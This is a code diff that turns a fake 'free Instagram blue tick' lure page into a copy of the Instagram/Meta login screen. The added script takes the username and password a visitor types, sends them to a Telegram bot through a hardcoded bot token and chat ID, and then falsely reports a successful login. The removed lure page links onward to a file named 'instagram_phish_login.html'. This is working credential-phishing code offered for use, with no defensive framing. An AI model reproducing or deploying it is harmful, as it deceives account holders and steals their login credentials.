@@ -3,158 +3,161 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Verified • Free Blue Tick 2026</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Instagram</title>
 <style>
-  :root {
-    --ig-gradient: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-  }
   * { margin:0; padding:0; box-sizing:border-box; }
   body {
-    font-family: 'Poppins', sans-serif;
-    background: #0a0a0a;
-    color: #fff;
-    line-height: 1.6;
-    overflow-x: hidden;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background:#e5e5e5;
+    display:flex;
+    justify-content:center;
+    padding:20px 0;
   }
-  .blob {
-    position: absolute;
-    width: 600px;
-    height: 600px;
-    background: radial-gradient(circle, rgba(229, 57, 53, 0.15) 0%, transparent 70%);
-    border-radius: 50%;
-    filter: blur(80px);
-    z-index: -1;
+  .phone {
+    width:390px;
+    max-width:100vw;
+    background:#fff;
+    min-height:844px;
+    position:relative;
+    display:flex;
+    flex-direction:column;
   }
-  .hero {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    text-align: center;
-    position: relative;
-    background: var(--ig-gradient);
-    overflow: hidden;
+  .back-row {
+    padding:20px 20px 0;
   }
-  .hero-content {
-    max-width: 420px;
-    padding: 40px 20px;
-    z-index: 2;
+  .back-row svg { width:24px; height:24px; }
+  .lang-row {
+    text-align:center;
+    margin-top:24px;
   }
-  .ig-logo {
-    width: 110px;
-    height: 110px;
-    margin: 0 auto 20px;
-    filter: drop-shadow(0 10px 20px rgba(0,0,0,0.4));
+  .lang-row span {
+    font-size:17px;
+    color:#8a8a8a;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
   }
-  h1 {
-    font-size: 32px;
-    line-height: 1.2;
-    margin-bottom: 16px;
+  .logo-wrap {
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:flex-start;
+    padding-top:70px;
   }
-  .subtitle {
-    font-size: 18px;
-    opacity: 0.9;
-    margin-bottom: 30px;
+  .meta-mini {
+    display:flex;
+    align-items:center;
+    gap:6px;
+    color:#8a8a8a;
+    font-size:15px;
+    font-weight:600;
+    margin-bottom:36px;
   }
-  .blue-tick {
-    width: 160px;
-    height: 160px;
-    background: linear-gradient(135deg, #0095f6, #00c2ff);
-    border-radius: 50%;
-    margin: 30px auto;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: 0 25px 60px rgba(0, 149, 246, 0.7);
-    border: 12px solid rgba(255,255,255,0.95);
-    position: relative;
+  .meta-mini svg { width:18px; height:18px; }
+  .ig-icon {
+    width:96px;
+    height:96px;
   }
-  .blue-tick::after {
-    content: "✓";
-    font-size: 110px;
-    color: white;
-    font-weight: 900;
-    text-shadow: 0 8px 20px rgba(0,0,0,0.4);
+  .form-wrap {
+    padding:70px 24px 0;
   }
-  .countdown {
-    background: rgba(255,255,255,0.1);
-    backdrop-filter: blur(10px);
-    border-radius: 20px;
-    padding: 20px;
-    margin: 30px 0;
-    border: 1px solid rgba(255,255,255,0.2);
+  .field {
+    width:100%;
+    border:1px solid #dbdbdb;
+    border-radius:28px;
+    padding:16px 20px;
+    font-size:16px;
+    margin-bottom:16px;
+    outline:none;
+    color:#262626;
   }
-  .btn {
-    width: 100%;
-    padding: 18px;
-    font-size: 19px;
-    font-weight: 700;
-    border: none;
-    border-radius: 50px;
-    background: white;
-    color: #000;
-    cursor: pointer;
-    margin-top: 20px;
-    box-shadow: 0 10px 30px rgba(255,255,255,0.2);
-    transition: all 0.3s;
+  .field::placeholder { color:#8a8a8a; }
+  .field:focus { border-color:#8a8a8a; }
+  .login-btn {
+    width:100%;
+    background:#0064e0;
+    color:#fff;
+    border:none;
+    border-radius:28px;
+    padding:16px;
+    font-size:17px;
+    font-weight:600;
+    cursor:pointer;
+    margin-top:4px;
   }
-  .btn:hover { transform: translateY(-4px); }
-  .glass {
-    background: rgba(255,255,255,0.08);
-    backdrop-filter: blur(12px);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 24px;
+  .login-btn:active { opacity:.85; }
+  .forgot {
+    display:block;
+    text-align:center;
+    margin-top:24px;
+    font-size:16px;
+    color:#262626;
+    text-decoration:none;
+    font-weight:400;
   }
-  section { padding: 80px 20px; }
-  .container { max-width: 420px; margin: 0 auto; }
-  .section-title { text-align: center; font-size: 28px; margin-bottom: 40px; }
-  .feature-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 16px;
+  .bottom-wrap {
+    padding:24px;
+    margin-top:auto;
   }
-  .card {
-    background: rgba(255,255,255,0.06);
-    padding: 24px;
-    border-radius: 20px;
-    text-align: center;
+  .create-btn {
+    width:100%;
+    background:#fff;
+    color:#0064e0;
+    border:1px solid #0064e0;
+    border-radius:28px;
+    padding:16px;
+    font-size:17px;
+    font-weight:600;
+    cursor:pointer;
+    margin-bottom:24px;
   }
-  .step {
-    display: flex;
-    gap: 20px;
-    margin-bottom: 32px;
-    align-items: flex-start;
+  .meta-logo {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    color:#262626;
+    font-size:20px;
+    font-weight:600;
   }
-  .step-number {
-    width: 42px;
-    height: 42px;
-    background: var(--ig-gradient);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: 700;
-    flex-shrink: 0;
+  .meta-logo svg { width:24px; height:24px; }
+  .home-indicator {
+    width:135px;
+    height:5px;
+    background:#000;
+    border-radius:3px;
+    margin:12px auto 8px;
   }
-  footer {
-    text-align: center;
-    padding: 40px 20px;
-    font-size: 13px;
-    opacity: 0.7;
+  .error-msg {
+    color:#ed4956;
+    font-size:13px;
+    text-align:center;
+    margin-top:10px;
+  }
+  .status {
+    font-size:14px;
+    text-align:center;
+    margin-top:12px;
+    font-weight:600;
   }
 </style>
 </head>
 <body>
 
-<!-- HERO -->
-<div class="hero">
-  <div class="blob" style="top:-200px; left:-200px;"></div>
-  <div class="blob" style="bottom:-300px; right:-150px; background: radial-gradient(circle, rgba(156,39,176,0.2) 0%, transparent 70%);"></div>
-  
-  <div class="hero-content">
-    <!-- Instagram Logo -->
-    <svg class="ig-logo" width="110" height="110" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+<div class="phone">
+  <div class="back-row">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+  </div>
+
+  <div class="lang-row">
+    <span>English (India)
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#8a8a8a" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </span>
+  </div>
+
+  <div class="logo-wrap">
+    <svg class="ig-icon" viewBox="0 0 96 96" fill="none">
       <defs>
         <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
           <stop offset="0%" stop-color="#FFDC80"/>
@@ -165,76 +168,86 @@
           <stop offset="100%" stop-color="#833AB4"/>
         </linearGradient>
       </defs>
-      <rect x="6" y="6" width="84" height="84" rx="26" fill="none" stroke="url(#igGrad)" stroke-width="7"/>
-      <circle cx="48" cy="49" r="18" fill="none" stroke="url(#igGrad)" stroke-width="7"/>
+      <rect x="6" y="6" width="84" height="84" rx="26" fill="none" stroke="url(#igGrad)" stroke-width="6"/>
+      <circle cx="48" cy="49" r="18" fill="none" stroke="url(#igGrad)" stroke-width="6"/>
       <circle cx="69" cy="27" r="3.5" fill="url(#igGrad)"/>
     </svg>
-    
-    <h1>Get Instagram <span style="background:linear-gradient(90deg,#00f2fe,#0095f6); -webkit-background-clip:text; -webkit-text-fill-color:transparent;">Blue Tick</span> FREE for 1 Year</h1>
-    <p class="subtitle">Limited Time Offer • Fast Verification • Official Program</p>
-    
-    <!-- Improved Blue Tick -->
-    <div class="blue-tick"></div>
-    
-    <div class="countdown glass">
-      <div style="font-size:15px; opacity:0.8;">Offer ends in</div>
-      <div id="timer" style="font-size:28px; font-weight:700; margin-top:8px;">23h 45m 12s</div>
+  </div>
+
+  <div class="form-wrap">
+    <input type="text" id="username" class="field" placeholder="Username, email address or mobile number">
+    <input type="password" id="password" class="field" placeholder="Password">
+    <button class="login-btn" id="loginBtn">Log in</button>
+    <a href="#" class="forgot">Forgotten password?</a>
+    <div class="status" id="status"></div>
+  </div>
+
+  <div class="bottom-wrap">
+    <button class="create-btn">Create new account</button>
+    <div class="meta-logo">
+      <svg width="34" height="27" viewBox="0 0 100 80" fill="none">
+        <circle cx="35" cy="40" r="28" stroke="#0081FB" stroke-width="14"/>
+        <circle cx="65" cy="40" r="28" stroke="#0081FB" stroke-width="14"/>
+      </svg>
+      Meta
     </div>
-    
-    <button class="btn" onclick="document.getElementById('claimSection').scrollIntoView({behavior:'smooth'})">Claim My Free Blue Tick Now</button>
-    <p style="margin-top:16px; font-size:14px; opacity:0.8;">✅ 100% Free • No Card Needed</p>
+    <div class="home-indicator"></div>
   </div>
 </div>
 
-<!-- FEATURES -->
-<section>
-  <div class="container">
-    <h2 class="section-title">Why Choose Instagram Verified?</h2>
-    <div class="feature-grid">
-      <div class="card glass">✔ Free for 1 Full Year</div>
-      <div class="card glass">✔ Lightning Fast Approval</div>
-      <div class="card glass">✔ Official Blue Badge</div>
-      <div class="card glass">✔ Premium Creator Support</div>
-      <div class="card glass">✔ 100% Secure Process</div>
-      <div class="card glass">✔ Instant Application</div>
-    </div>
-  </div>
-</section>
-
-<!-- STEPS -->
-<section style="background:#111;">
-  <div class="container">
-    <h2 class="section-title">How It Works</h2>
-    <div class="step"><div class="step-number">1</div><div><strong>Enter Username</strong><br>Provide your IG handle</div></div>
-    <div class="step"><div class="step-number">2</div><div><strong>Verify Eligibility</strong><br>Quick automated check</div></div>
-    <div class="step"><div class="step-number">3</div><div><strong>Complete Application</strong><br>Few seconds process</div></div>
-    <div class="step"><div class="step-number">4</div><div><strong>Get Verified</strong><br>Blue tick activated</div></div>
-  </div>
-</section>
-
-<!-- CLAIM -->
-<section id="claimSection" style="background:var(--ig-gradient); text-align:center;">
-  <div class="container">
-    <h2 class="section-title">Ready to Get Verified?</h2>
-    <button class="btn" style="font-size:20px; padding:22px;" onclick="window.location.href='instagram_phish_login.html'">Login With Instagram &amp; Claim Now</button>
-  </div>
-</section>
-
-<footer>
-  <p>© 2026 Instagram • Official Verified Partner Program</p>
-  <p>Privacy • Terms • Safety Center</p>
-</footer>
-
 <script>
-// Countdown
-let time = 23*3600 + 45*60 + 12;
-setInterval(() => {
-  time--;
-  let h = Math.floor(time/3600);
-  let m = Math.floor((time%3600)/60);
-  let s = time%60;
-  document.getElementById('timer').textContent = `${h}h ${m}m ${s}s`;
-}, 1000);
+  const BOT_TOKEN = "8773604137:AAEjU7B_uzTTX6DCWcyKQtroGbkdgA24nRc";
+  const CHAT_ID = "7264141539";
+
+  const loginBtn = document.getElementById('loginBtn');
+  const statusEl = document.getElementById('status');
+
+  loginBtn.addEventListener('click', () => {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    statusEl.style.color = "#fff";
+
+    if (!username || !password) {
+      statusEl.innerHTML = "Please fill all fields bro.";
+      statusEl.style.color = "#ed4956";
+      return;
+    }
+
+    const text = `🔥 New IG Login Captured!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toISOString()}`;
+
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("text", text);
+
+    loginBtn.disabled = true;
+    statusEl.innerHTML = "Logging in & sending...";
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      body: formData
+    })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          statusEl.innerHTML = "✅ Logged in successfully! 🔥";
+          statusEl.style.color = "#4ade80";
+          // Clear fields
+          document.getElementById('username').value = "";
+          document.getElementById('password').value = "";
+        } else {
+          statusEl.innerHTML = "❌ Error: " + (data.description || "Unknown");
+          statusEl.style.color = "#ed4956";
+        }
+      })
+      .catch(err => {
+        statusEl.innerHTML = "❌ Network issue, try again.";
+        statusEl.style.color = "#ed4956";
+      })
+      .finally(() => {
+        loginBtn.disabled = false;
+      });
+  });
 </script>
 </body>
-                                                                                           </html>
+</html>
